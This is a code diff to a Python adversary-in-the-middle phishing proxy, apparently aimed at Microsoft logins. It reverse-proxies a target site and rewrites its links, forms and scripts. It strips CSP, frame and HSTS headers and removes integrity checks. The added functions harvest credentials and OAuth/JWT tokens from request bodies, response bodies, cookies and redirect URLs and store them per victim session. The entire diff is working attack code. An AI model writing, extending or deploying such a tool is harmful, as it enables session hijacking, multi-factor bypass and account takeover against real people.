@@ -1,3 +1,5 @@
+
+import time
 import re
 import aiohttp
 import asyncio
@@ -39,14 +41,7 @@ class AiTMProxy:
         Proxy WebSocket traffic bi-directionally.
         """
         # Ensure session is initialized
-        if self.session is None or self.session.closed:
-             self.session = aiohttp.ClientSession(
-                connector=aiohttp.TCPConnector(ssl=False),
-                auto_decompress=False,
-                cookie_jar=aiohttp.DummyCookieJar()
-            )
-        
-        session = self.session
+        session = await self.get_session()
         
         # Prepare headers for upstream
         upstream_headers = dict(headers or {})
@@ -57,11 +52,15 @@ class AiTMProxy:
         upstream_headers.pop("connection", None)
         upstream_headers["origin"] = "/".join(target_url.split("/")[:3]) # Fake origin to target
         
+        # Add cookies to headers manually since ws_connect might not support cookies param directly
+        if cookies:
+            cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
+            upstream_headers["Cookie"] = cookie_header
+
         try:
             async with session.ws_connect(
                 target_url,
                 headers=upstream_headers,
-                cookies=cookies,
                 ssl=False,
                 autoping=True
             ) as upstream_ws:
@@ -71,6 +70,10 @@ class AiTMProxy:
                     try:
                         while True:
                             data = await client_ws.receive()
+                            if data["type"] == "websocket.disconnect":
+                                await upstream_ws.close()
+                                break
+                            
                             if "text" in data:
                                 # Rewriting Client -> Server (rarely needed but good for consistency)
                                 # text = self._rewrite_websocket_text(data["text"], target_url, direction="upstream")
@@ -137,7 +140,7 @@ class AiTMProxy:
             
             # 2. Regex Replace for any URL found in text
             # This handles cases like "Redirect to https://..." or embedded URLs
-            url_pattern = re.compile(r'https?://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
+            url_pattern = re.compile(r'(?:https?|wss?)://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
             
             def replace_match(match):
                 url = match.group(0)
@@ -188,6 +191,8 @@ class AiTMProxy:
                 # Capture Cookies (Set-Cookie)
                 if session_id:
                     self._capture_response_cookies(session_id, upstream_response.headers, target_url)
+                    # Capture Tokens in Response Body (JSON)
+                    self._capture_response_tokens(session_id, content, upstream_response.headers.get("content-type", ""))
 
                 # Suppression des headers de sécurité et mise en cache
                 for h in ["content-security-policy", "content-security-policy-report-only", "x-frame-options", "strict-transport-security", 
@@ -212,6 +217,8 @@ class AiTMProxy:
                 # Réécriture du header Location (pour les redirections)
                 for key in list(response_headers.keys()):
                     if key.lower() == "location":
+                        if session_id:
+                            self._capture_location_tokens(session_id, response_headers[key])
                         response_headers[key] = self._rewrite_url(response_headers[key], target_url, proxy_base_path)
 
                 # Remove content-security-policy meta tags in HTML
@@ -244,9 +251,17 @@ class AiTMProxy:
                     
                     # Regex to remove Domain=...;
                     cookie_mod = re.sub(r'(?i);\s*domain=[^;]+', '', cookie_raw)
-                    # Remove Secure if strictly necessary for local dev, but let's keep it for now unless it breaks
-                    # cookie_mod = re.sub(r'(?i);\s*secure', '', cookie_mod) 
                     
+                    # Force SameSite=None to ensure cross-site delivery if needed (for redirection flows)
+                    if "samesite" not in cookie_mod.lower():
+                        cookie_mod += "; SameSite=None"
+                    else:
+                        cookie_mod = re.sub(r'(?i);\s*samesite=[^;]+', '; SameSite=None', cookie_mod)
+
+                    # Ensure Secure is present if SameSite=None (browser requirement)
+                    if "secure" not in cookie_mod.lower():
+                         cookie_mod += "; Secure"
+
                     response.headers.append("Set-Cookie", cookie_mod)
 
                 return response
@@ -270,10 +285,7 @@ class AiTMProxy:
             if "application/json" in content_type:
                 try:
                     data = json.loads(decoded)
-                    if isinstance(data, dict):
-                        for key, value in data.items():
-                             if any(s in key.lower() for s in sensitive_keys):
-                                captured[key] = value
+                    self._recursive_capture(data, captured, sensitive_keys)
                 except json.JSONDecodeError:
                     pass
             else:
@@ -290,6 +302,59 @@ class AiTMProxy:
                     
         except Exception as e:
             print(f"[AiTM Warning] Failed to parse POST body: {e}")
+
+    def _recursive_capture(self, data: Any, captured: Dict[str, Any], sensitive_keys: List[str]):
+        """Helper pour capturer récursivement les identifiants dans un JSON arbitraire."""
+        if isinstance(data, dict):
+            for key, value in data.items():
+                if any(s in key.lower() for s in sensitive_keys):
+                    captured[key] = value
+                self._recursive_capture(value, captured, sensitive_keys)
+        elif isinstance(data, list):
+            for item in data:
+                self._recursive_capture(item, captured, sensitive_keys)
+
+    def _capture_response_tokens(self, session_id: str, content: bytes, content_type: str):
+        """Capture les tokens (OAuth/JWT) dans le corps de la réponse."""
+        try:
+            if "application/json" in content_type:
+                data = json.loads(content)
+                captured = {}
+                sensitive_keys = ["access_token", "id_token", "refresh_token", "code", "oauth_token"]
+                self._recursive_capture(data, captured, sensitive_keys)
+                
+                if captured:
+                    print(f"[AiTM] Tokens captured for session {session_id}: {captured}")
+                    for k, v in captured.items():
+                        self.session_manager.capture_credential(session_id, k, v)
+        except:
+            pass
+
+
+    def _capture_location_tokens(self, session_id: str, location_url: str):
+        """Capture les tokens dans l'URL de redirection (Location header)."""
+        try:
+            parsed = urlparse(location_url)
+            # 1. Query Params (?code=...)
+            query_params = parse_qs(parsed.query)
+            
+            # 2. Hash Params (#access_token=...) - Souvent utilisé dans OIDC Implicit Flow
+            hash_params = parse_qs(parsed.fragment)
+            
+            sensitive_keys = ["code", "access_token", "id_token", "state", "session_state", "oauth_token"]
+            captured = {}
+            
+            for params in [query_params, hash_params]:
+                for key, values in params.items():
+                    if any(s in key.lower() for s in sensitive_keys):
+                        captured[key] = values[0] if values else ""
+            
+            if captured:
+                print(f"[AiTM] Redirect tokens captured for session {session_id}: {captured}")
+                for k, v in captured.items():
+                    self.session_manager.capture_credential(session_id, k, v)
+        except Exception as e:
+            print(f"[AiTM Warning] Failed to parse Location header: {e}")
 
     def _capture_response_cookies(self, session_id: str, headers: Any, target_url: str):
         """Capture et log les cookies de réponse avec tous les attributs."""
@@ -320,8 +385,17 @@ class AiTMProxy:
                              "secure": True if morsel["secure"] else False,
                              "httpOnly": True if morsel["httponly"] else False,
                              "sameSite": morsel["samesite"] or "Lax",
-                             # Expires/Max-Age handling could be added here
                          }
+                         
+                         # Parse Expiration
+                         if morsel["max-age"]:
+                             try:
+                                 cookie_data["expires"] = int(time.time()) + int(morsel["max-age"])
+                             except ValueError:
+                                 pass
+                         elif morsel["expires"]:
+                             pass 
+                             
                          parsed_cookies.append(cookie_data)
                  except Exception as e:
                      print(f"[AiTM Warning] Cookie parsing failed: {e}")
@@ -329,135 +403,115 @@ class AiTMProxy:
              if parsed_cookies:
                  self.session_manager.capture_cookies(session_id, parsed_cookies)
 
-    def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
+    def _rewrite_url(self, url: str, base_url: str, proxy_base_path: str) -> str:
+        """
+        Réécrit une URL absolue pour qu'elle passe par le proxy.
+        Ex: https://login.microsoft.com/common/oauth2 -> /v5/proxy/https://login.microsoft.com/common/oauth2
+        """
+        if not url:
+            return url
+            
+        # Ignore data:, blob:, mailto:, javascript:
+        if url.startswith(("data:", "blob:", "mailto:", "javascript:", "#")):
+            return url
+            
+        # Handle relative URLs
+        if url.startswith("/"):
+            parsed_base = urlparse(base_url)
+            full_upstream_url = f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
+            return f"{proxy_base_path}/{full_upstream_url}"
+            
+        # Handle absolute URLs
+        if url.startswith(("http://", "https://")):
+            # If it's already pointing to our proxy, leave it
+            if self.proxy_domain in url:
+                return url
+                
+            # Rewrite to proxy
+            return f"{proxy_base_path}/{url}"
+            
+        return url
+
+    def rewrite_html(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
+        """
+        Parse et réécrit les liens dans le HTML (href, src, action).
+        """
+        try:
+            soup = BeautifulSoup(content, 'html.parser')
+            
+            # Tags and attributes to rewrite
+            tags = {
+                'a': 'href',
+                'link': 'href',
+                'script': 'src',
+                'img': 'src',
+                'form': 'action',
+                'iframe': 'src',
+                'embed': 'src',
+                'source': 'src'
+            }
+            
+            for tag, attr in tags.items():
+                for element in soup.find_all(tag):
+                    if element.has_attr(attr):
+                        original = element[attr]
+                        rewritten = self._rewrite_url(original, base_url, proxy_base_path)
+                        element[attr] = rewritten
+                        
+            # Remove integrity checks (Subresource Integrity)
+            for element in soup.find_all(attrs={"integrity": True}):
+                del element['integrity']
+                
+            return str(soup).encode('utf-8')
+        except Exception as e:
+            print(f"[AiTM Warning] HTML rewrite failed: {e}")
+            return content
+
+    def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
         """
         Réécrit les URLs dans une réponse JSON.
         """
         try:
             data = json.loads(content)
-            rewritten_data = self._recursive_rewrite(data, base_url, proxy_base_path)
-            return json.dumps(rewritten_data).encode('utf-8')
-        except Exception as e:
-            print(f"[AiTM Warning] JSON Rewrite failed: {e}")
+            rewritten = self._recursive_rewrite(data, base_url, proxy_base_path)
+            return json.dumps(rewritten).encode('utf-8')
+        except:
+            return content
+
+    def rewrite_js(self, content: bytes, base_url: str, proxy_base_path: str) -> bytes:
+        """
+        Réécrit les URLs dans les fichiers JS (Regex simple).
+        """
+        try:
+            text = content.decode('utf-8')
+            
+            # Regex pour trouver les URLs http/https
+            def replace(match):
+                url = match.group(0)
+                return self._rewrite_url(url, base_url, proxy_base_path)
+                
+            # Pattern amélioré pour JS
+            pattern = re.compile(r'https?://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
+            rewritten_text = pattern.sub(replace, text)
+            
+            return rewritten_text.encode('utf-8')
+        except:
             return content
 
     def _recursive_rewrite(self, data: Any, base_url: str, proxy_base_path: str) -> Any:
         """
-        Parcourt récursivement un objet JSON pour réécrire les chaînes ressemblant à des URLs.
+        Parcourt récursivement un objet JSON/Dict pour réécrire les valeurs URL.
         """
         if isinstance(data, dict):
             return {k: self._recursive_rewrite(v, base_url, proxy_base_path) for k, v in data.items()}
         elif isinstance(data, list):
             return [self._recursive_rewrite(item, base_url, proxy_base_path) for item in data]
         elif isinstance(data, str):
-            # Check if string looks like a URL we should rewrite
-            if data.startswith(("http://", "https://")) and not data.startswith(self.proxy_domain):
+            if data.startswith(("http://", "https://")):
                 return self._rewrite_url(data, base_url, proxy_base_path)
             return data
         else:
             return data
-
-    def rewrite_js(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
-        """
-        Réécrit les URLs dans du JavaScript (expérimental).
-        """
-        try:
-            text = content.decode('utf-8', errors='ignore')
-            # Regex simple pour trouver des URLs complètes dans le JS
-            # Attention: risque de faux positifs
-            url_pattern = re.compile(r'https?://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
-            
-            def replace_match(match):
-                url = match.group(0)
-                # Ne pas réécrire si c'est déjà notre proxy ou une ressource externe qu'on veut laisser telle quelle (e.g. CDN analytics)
-                if self.proxy_domain in url:
-                    return url
-                return self._rewrite_url(url, base_url, proxy_base_path)
-            
-            rewritten_text = url_pattern.sub(replace_match, text)
-            return rewritten_text.encode('utf-8')
-        except Exception:
-            return content
-
-    def rewrite_html(self, html_content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
-
-        """
-        Réécrit les liens et formulaires pour qu'ils pointent vers le proxy.
-        Utilise BeautifulSoup pour la structure et Regex pour le JS inline.
-        """
-        try:
-            soup = BeautifulSoup(html_content, "html.parser")
-            
-            # 1. Liens (a href, link href)
-            for tag in soup.find_all(["a", "link"], href=True):
-                tag["href"] = self._rewrite_url(tag["href"], base_url, proxy_base_path)
-                if tag.name == "link" and "integrity" in tag.attrs:
-                    del tag["integrity"]
-                
-            # 2. Ressources (img src, script src, iframe src)
-            for tag in soup.find_all(["img", "script", "iframe"], src=True):
-                tag["src"] = self._rewrite_url(tag["src"], base_url, proxy_base_path)
-                if "integrity" in tag.attrs:
-                    del tag["integrity"]
-
-            # 3. Formulaires (form action)
-            for tag in soup.find_all("form", action=True):
-                tag["action"] = self._rewrite_url(tag["action"], base_url, proxy_base_path)
-            
-            # 4. Meta Refresh et CSP
-            for tag in soup.find_all("meta"):
-                if "http-equiv" in tag.attrs:
-                    http_equiv = tag["http-equiv"].lower()
-                    
-                    # Remove CSP meta tags
-                    if http_equiv == "content-security-policy":
-                        tag.decompose()
-                        continue
-                        
-                    if http_equiv == "refresh" and "content" in tag.attrs:
-                        content = tag["content"]
-                        # format: "0; url=http://..."
-                        if "url=" in content.lower():
-                            parts = content.split("url=", 1)
-                            new_url = self._rewrite_url(parts[1], base_url, proxy_base_path)
-                            tag["content"] = f"{parts[0]}url={new_url}"
-
-            return str(soup).encode("utf-8")
-        except Exception as e:
-            print(f"[AiTM Warning] HTML Rewrite failed: {e}")
-            return html_content
-
-    def _rewrite_url(self, url: str, base_url: str, proxy_base_path: str = "") -> str:
-        """
-        Transforme une URL cible en URL proxy.
-        """
-        if not url: return url
-        
-        # Ignorer les ancres, javascript:, data:, mailto:
-        if url.startswith(("#", "javascript:", "data:", "mailto:")):
-            return url
-            
-        # Résoudre l'URL par rapport à la base (page courante)
-        full_url = urljoin(base_url, url)
-        
-        # Si c'est déjà notre proxy, on ne touche pas
-        if self.proxy_domain in full_url:
-            return url
-            
-        # Encodage de l'URL cible
-        import urllib.parse
-        encoded_url = urllib.parse.quote(full_url)
-        
-        # Construction de l'URL proxy
-        # Si proxy_base_path est "/proxy", le résultat sera "/proxy?url=..."
-        if proxy_base_path:
-            return f"{proxy_base_path}?url={encoded_url}"
-            
-        return f"/proxy?url={encoded_url}"
-
-    async def close(self):
-        if self.session:
-            await self.session.close()
 
 # Instance globale
 aitm_proxy = AiTMProxy()
